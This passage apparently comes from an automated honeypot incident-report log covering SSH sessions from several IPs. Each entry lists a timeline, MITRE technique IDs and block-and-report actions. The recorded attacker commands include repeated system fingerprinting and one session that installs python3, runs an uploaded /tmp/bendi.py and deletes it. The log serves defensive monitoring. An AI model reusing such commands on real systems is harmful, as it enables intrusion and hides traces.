| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:14:00` | `cowrie.session.connect` |
| `2026-07-25 10:14:00` | `cowrie.client.version` |
| `2026-07-25 10:14:00` | `cowrie.client.kex` |
| `2026-07-25 10:14:02` | `cowrie.login.success` |
| `2026-07-25 10:14:04` | `cowrie.session.params` |
| `2026-07-25 10:14:04` | `cowrie.command.input` |
| `2026-07-25 10:14:04` | `cowrie.command.input` |
| `2026-07-25 10:14:04` | `cowrie.command.input` |
| `2026-07-25 10:14:04` | `cowrie.command.input` |
| `2026-07-25 10:14:04` | `cowrie.command.input` |
| `2026-07-25 10:14:04` | `cowrie.command.success` |
| `2026-07-25 10:14:04` | `cowrie.command.input` |
| `2026-07-25 10:14:04` | `cowrie.command.input` |
| `2026-07-25 10:14:04` | `cowrie.command.input` |
| `2026-07-25 10:14:04` | `cowrie.command.input` |
| `2026-07-25 10:14:04` | `cowrie.log.closed` |
| `2026-07-25 10:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-019d10f19eb2

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-25 10:15 |
| **Last Seen** | 2026-07-25 10:17 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:15:14` | `cowrie.session.connect` |
| `2026-07-25 10:15:14` | `cowrie.client.version` |
| `2026-07-25 10:15:14` | `cowrie.client.kex` |
| `2026-07-25 10:15:15` | `cowrie.login.success` |
| `2026-07-25 10:15:16` | `cowrie.session.file_upload` |
| `2026-07-25 10:15:17` | `cowrie.session.params` |
| `2026-07-25 10:15:17` | `cowrie.command.input` |
| `2026-07-25 10:15:17` | `cowrie.command.input` |
| `2026-07-25 10:15:17` | `cowrie.command.input` |
| `2026-07-25 10:15:17` | `cowrie.command.failed` |
| `2026-07-25 10:15:18` | `cowrie.log.closed` |
| `2026-07-25 10:15:19` | `cowrie.session.params` |
| `2026-07-25 10:15:19` | `cowrie.command.input` |
| `2026-07-25 10:15:19` | `cowrie.log.closed` |
| `2026-07-25 10:15:20` | `cowrie.session.params` |
| `2026-07-25 10:15:20` | `cowrie.command.input` |
| `2026-07-25 10:15:20` | `cowrie.log.closed` |
| `2026-07-25 10:15:21` | `cowrie.session.params` |
| `2026-07-25 10:15:21` | `cowrie.command.input` |
| `2026-07-25 10:15:21` | `cowrie.command.failed` |
| `2026-07-25 10:15:21` | `cowrie.command.failed` |
| `2026-07-25 10:16:23` | `cowrie.session.params` |
| `2026-07-25 10:16:23` | `cowrie.command.input` |
| `2026-07-25 10:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60416981e4b7

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 10:15 |
| **Last Seen** | 2026-07-25 10:15 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:15:22` | `cowrie.session.connect` |
| `2026-07-25 10:15:22` | `cowrie.client.version` |
| `2026-07-25 10:15:34` | `cowrie.client.kex` |
| `2026-07-25 10:15:35` | `cowrie.login.success` |
| `2026-07-25 10:15:35` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:15:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 10:15:37` | `cowrie.direct-tcpip.data` |
| `2026-07-25 10:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3c4efd92b0e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:15 |
| **Last Seen** | 2026-07-25 10:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:15:53` | `cowrie.session.connect` |
| `2026-07-25 10:15:53` | `cowrie.client.version` |
| `2026-07-25 10:15:53` | `cowrie.client.kex` |
| `2026-07-25 10:15:55` | `cowrie.login.success` |
| `2026-07-25 10:15:56` | `cowrie.session.params` |
| `2026-07-25 10:15:56` | `cowrie.command.input` |
| `2026-07-25 10:15:56` | `cowrie.command.input` |
| `2026-07-25 10:15:56` | `cowrie.command.input` |
| `2026-07-25 10:15:56` | `cowrie.command.input` |
| `2026-07-25 10:15:56` | `cowrie.command.input` |
| `2026-07-25 10:15:56` | `cowrie.command.success` |
| `2026-07-25 10:15:56` | `cowrie.command.input` |
| `2026-07-25 10:15:56` | `cowrie.command.input` |
| `2026-07-25 10:15:56` | `cowrie.command.input` |
| `2026-07-25 10:15:56` | `cowrie.command.input` |
| `2026-07-25 10:15:56` | `cowrie.log.closed` |
| `2026-07-25 10:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad6a65da6dfe

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]3` |
| **First Seen** | 2026-07-25 10:16 |
| **Last Seen** | 2026-07-25 10:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:16:35` | `cowrie.session.connect` |
| `2026-07-25 10:16:36` | `cowrie.client.version` |
| `2026-07-25 10:16:36` | `cowrie.client.kex` |
| `2026-07-25 10:16:38` | `cowrie.login.success` |
| `2026-07-25 10:16:38` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b942354cefc

| Field | Detail |
|---|---|
| **Source IP** | `211.247.127[.]250` |
| **First Seen** | 2026-07-25 10:16 |
| **Last Seen** | 2026-07-25 10:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:16:44` | `cowrie.session.connect` |
| `2026-07-25 10:16:44` | `cowrie.client.version` |
| `2026-07-25 10:16:44` | `cowrie.client.kex` |
| `2026-07-25 10:16:47` | `cowrie.login.success` |
| `2026-07-25 10:16:48` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.247.127[.]250` to AbuseIPDB if not already reported
- [ ] Block `211.247.127[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf0a4b67a539

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 10:17 |
| **Last Seen** | 2026-07-25 10:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:17:42` | `cowrie.session.connect` |
| `2026-07-25 10:17:42` | `cowrie.client.version` |
| `2026-07-25 10:17:43` | `cowrie.client.kex` |
| `2026-07-25 10:17:45` | `cowrie.login.success` |
| `2026-07-25 10:17:46` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:17:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 10:17:47` | `cowrie.direct-tcpip.data` |
| `2026-07-25 10:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eec46f762a4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:17 |
| **Last Seen** | 2026-07-25 10:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:17:46` | `cowrie.session.connect` |
| `2026-07-25 10:17:47` | `cowrie.client.version` |
| `2026-07-25 10:17:47` | `cowrie.client.kex` |
| `2026-07-25 10:17:48` | `cowrie.login.success` |
| `2026-07-25 10:17:49` | `cowrie.session.params` |
| `2026-07-25 10:17:49` | `cowrie.command.input` |
| `2026-07-25 10:17:49` | `cowrie.command.input` |
| `2026-07-25 10:17:49` | `cowrie.command.input` |
| `2026-07-25 10:17:49` | `cowrie.command.input` |
| `2026-07-25 10:17:49` | `cowrie.command.input` |
| `2026-07-25 10:17:49` | `cowrie.command.success` |
| `2026-07-25 10:17:49` | `cowrie.command.input` |
| `2026-07-25 10:17:49` | `cowrie.command.input` |
| `2026-07-25 10:17:49` | `cowrie.command.input` |
| `2026-07-25 10:17:49` | `cowrie.command.input` |
| `2026-07-25 10:17:50` | `cowrie.log.closed` |
| `2026-07-25 10:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9908b2b590be

| Field | Detail |
|---|---|
| **Source IP** | `221.199.172[.]66` |
| **First Seen** | 2026-07-25 10:17 |
| **Last Seen** | 2026-07-25 10:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:17:57` | `cowrie.session.connect` |
| `2026-07-25 10:17:58` | `cowrie.client.version` |
| `2026-07-25 10:17:58` | `cowrie.client.kex` |
| `2026-07-25 10:18:00` | `cowrie.login.success` |
| `2026-07-25 10:18:00` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:18:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.199.172[.]66` to AbuseIPDB if not already reported
- [ ] Block `221.199.172[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de4b5265118c

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-25 10:18 |
| **Last Seen** | 2026-07-25 10:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:18:05` | `cowrie.session.connect` |
| `2026-07-25 10:18:06` | `cowrie.client.version` |
| `2026-07-25 10:18:06` | `cowrie.client.kex` |
| `2026-07-25 10:18:07` | `cowrie.login.success` |
| `2026-07-25 10:18:08` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-989cd6542a02

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:19 |
| **Last Seen** | 2026-07-25 10:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:19:39` | `cowrie.session.connect` |
| `2026-07-25 10:19:39` | `cowrie.client.version` |
| `2026-07-25 10:19:39` | `cowrie.client.kex` |
| `2026-07-25 10:19:40` | `cowrie.login.success` |
| `2026-07-25 10:19:41` | `cowrie.session.params` |
| `2026-07-25 10:19:41` | `cowrie.command.input` |
| `2026-07-25 10:19:41` | `cowrie.command.input` |
| `2026-07-25 10:19:41` | `cowrie.command.input` |
| `2026-07-25 10:19:41` | `cowrie.command.input` |
| `2026-07-25 10:19:41` | `cowrie.command.input` |
| `2026-07-25 10:19:41` | `cowrie.command.success` |
| `2026-07-25 10:19:41` | `cowrie.command.input` |
| `2026-07-25 10:19:41` | `cowrie.command.input` |
| `2026-07-25 10:19:41` | `cowrie.command.input` |
| `2026-07-25 10:19:41` | `cowrie.command.input` |
| `2026-07-25 10:19:42` | `cowrie.log.closed` |
| `2026-07-25 10:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44699b41a85a

| Field | Detail |
|---|---|
| **Source IP** | `190.12.109[.]162` |
| **First Seen** | 2026-07-25 10:19 |
| **Last Seen** | 2026-07-25 10:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:19:59` | `cowrie.session.connect` |
| `2026-07-25 10:20:00` | `cowrie.client.version` |
| `2026-07-25 10:20:00` | `cowrie.client.kex` |
| `2026-07-25 10:20:02` | `cowrie.login.success` |
| `2026-07-25 10:20:02` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.12.109[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.12.109[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3efc6f7e615d

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-07-25 10:20 |
| **Last Seen** | 2026-07-25 10:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:20:08` | `cowrie.session.connect` |
| `2026-07-25 10:20:09` | `cowrie.client.version` |
| `2026-07-25 10:20:09` | `cowrie.client.kex` |
| `2026-07-25 10:20:11` | `cowrie.login.success` |
| `2026-07-25 10:20:12` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da007eda9381

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 10:21 |
| **Last Seen** | 2026-07-25 10:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:21:06` | `cowrie.session.connect` |
| `2026-07-25 10:21:06` | `cowrie.client.version` |
| `2026-07-25 10:21:06` | `cowrie.client.kex` |
| `2026-07-25 10:21:10` | `cowrie.login.success` |
| `2026-07-25 10:21:11` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:21:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 10:21:11` | `cowrie.direct-tcpip.data` |
| `2026-07-25 10:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed1b3e77fc01

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:21 |
| **Last Seen** | 2026-07-25 10:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:21:41` | `cowrie.session.connect` |
| `2026-07-25 10:21:41` | `cowrie.client.version` |
| `2026-07-25 10:21:41` | `cowrie.client.kex` |
| `2026-07-25 10:21:42` | `cowrie.login.success` |
| `2026-07-25 10:21:43` | `cowrie.session.params` |
| `2026-07-25 10:21:43` | `cowrie.command.input` |
| `2026-07-25 10:21:43` | `cowrie.command.input` |
| `2026-07-25 10:21:43` | `cowrie.command.input` |
| `2026-07-25 10:21:43` | `cowrie.command.input` |
| `2026-07-25 10:21:43` | `cowrie.command.input` |
| `2026-07-25 10:21:43` | `cowrie.command.success` |
| `2026-07-25 10:21:43` | `cowrie.command.input` |
| `2026-07-25 10:21:43` | `cowrie.command.input` |
| `2026-07-25 10:21:43` | `cowrie.command.input` |
| `2026-07-25 10:21:43` | `cowrie.command.input` |
| `2026-07-25 10:21:44` | `cowrie.log.closed` |
| `2026-07-25 10:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-047c87765618

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:23 |
| **Last Seen** | 2026-07-25 10:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:23:48` | `cowrie.session.connect` |
| `2026-07-25 10:23:48` | `cowrie.client.version` |
| `2026-07-25 10:23:48` | `cowrie.client.kex` |
| `2026-07-25 10:23:49` | `cowrie.login.success` |
| `2026-07-25 10:23:50` | `cowrie.session.params` |
| `2026-07-25 10:23:50` | `cowrie.command.input` |
| `2026-07-25 10:23:50` | `cowrie.command.input` |
| `2026-07-25 10:23:50` | `cowrie.command.input` |
| `2026-07-25 10:23:50` | `cowrie.command.input` |
| `2026-07-25 10:23:50` | `cowrie.command.input` |
| `2026-07-25 10:23:50` | `cowrie.command.success` |
| `2026-07-25 10:23:50` | `cowrie.command.input` |
| `2026-07-25 10:23:50` | `cowrie.command.input` |
| `2026-07-25 10:23:50` | `cowrie.command.input` |
| `2026-07-25 10:23:50` | `cowrie.command.input` |
| `2026-07-25 10:23:50` | `cowrie.log.closed` |
| `2026-07-25 10:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48c3d6b17664

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:25 |
| **Last Seen** | 2026-07-25 10:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:25:52` | `cowrie.session.connect` |
| `2026-07-25 10:25:53` | `cowrie.client.version` |
| `2026-07-25 10:25:53` | `cowrie.client.kex` |
| `2026-07-25 10:25:54` | `cowrie.login.success` |
| `2026-07-25 10:25:55` | `cowrie.session.params` |
| `2026-07-25 10:25:55` | `cowrie.command.input` |
| `2026-07-25 10:25:55` | `cowrie.command.input` |
| `2026-07-25 10:25:55` | `cowrie.command.input` |
| `2026-07-25 10:25:55` | `cowrie.command.input` |
| `2026-07-25 10:25:55` | `cowrie.command.input` |
| `2026-07-25 10:25:55` | `cowrie.command.success` |
| `2026-07-25 10:25:55` | `cowrie.command.input` |
| `2026-07-25 10:25:55` | `cowrie.command.input` |
| `2026-07-25 10:25:55` | `cowrie.command.input` |
| `2026-07-25 10:25:55` | `cowrie.command.input` |
